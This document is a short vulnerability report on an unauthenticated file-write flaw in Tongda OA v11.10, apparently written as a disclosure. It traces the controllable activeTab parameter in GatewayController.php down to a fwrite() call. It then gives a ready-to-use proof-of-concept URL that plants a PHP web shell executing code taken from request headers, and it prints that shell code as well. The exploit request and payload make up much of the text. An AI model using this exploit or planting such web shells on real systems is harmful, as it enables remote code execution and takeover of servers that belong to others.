Tongda OA v11.10 has unauthorized arbitrary file upload vulnerability

official website:https://www.tongda2000.com/

version:v11.10

1. The actionGetdata() method exists in the code general\appbuilder\modules\portal\controllers\GatewayController.php, where the activeTab parameter is controllable. In line 2018 the activeTab argument is in the GetData method.

![WPS图片(1)](https://user-images.githubusercontent.com/131632691/236481314-252c56c0-e488-4523-bb24-3d56b149fbbf.png)

In the GetData() method, query the id argument by findall to see if the array exists, and if the queried id does, enter the if statement on line 21. So the $attribute argument in line 38 is controllable, causing the array to be closed and thus written to the file via fwrite().

![WPS图片(2)](https://user-images.githubusercontent.com/131632691/236481926-d2a3976d-8c18-46eb-b3e0-59602a4861df.png)

2. The vulnerability reappears

poc

```
http://url/general/appbuilder/web/portal/gateway/getdata?activeTab=%e5%27,1%3d%3Efwrite(fopen(%22C:/YAOA/webroot/general/1.php%22,%22w+%22),%22%3C?php%20eval(next(getallheaders()));%22))%3b/*&id=266&module=Carouselimage
```

![WPS图片(3)](https://user-images.githubusercontent.com/131632691/236482594-8413af7a-b2be-414d-b505-6e2168315c80.png)

Write php files with fwrite(fopen()) through array closure, and bypass global filtering with no parameter.

```
<? php eval(next(getallheaders()));
```

![WPS图片(4)](https://user-images.githubusercontent.com/131632691/236483030-f919db34-e785-44ed-9709-668de0edd75e.png)


Write the 2.php file with no argument, and the file contents are as follows.

![WPS图片(5)](https://user-images.githubusercontent.com/131632691/236483301-fc6a2a6e-06f3-43b4-9ecb-112b09c71ae1.png)

![WPS图片(6)](https://user-images.githubusercontent.com/131632691/236483345-d9d89c17-54aa-4c59-b812-b0175f7f45e8.png)


